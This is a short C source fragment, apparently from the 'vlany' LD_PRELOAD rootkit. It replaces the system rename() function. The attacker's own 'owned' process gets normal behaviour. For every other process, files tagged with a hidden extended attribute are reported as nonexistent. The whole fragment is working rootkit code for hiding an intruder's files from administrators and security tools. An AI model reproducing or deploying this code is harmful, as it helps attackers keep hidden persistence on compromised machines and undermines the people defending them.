int rename(const char *oldpath, const char *newpath)
{
    #ifdef DEBUG
        printf("[vlany] rename() called\n");
    #endif

    HOOK(old_rename, CRENAME);

    if(owned()) return old_rename(oldpath, newpath);

    if(hidden_xattr(oldpath) || hidden_xattr(newpath)) { errno = ENOENT; return -1; }

    return old_rename(oldpath, newpath);
}
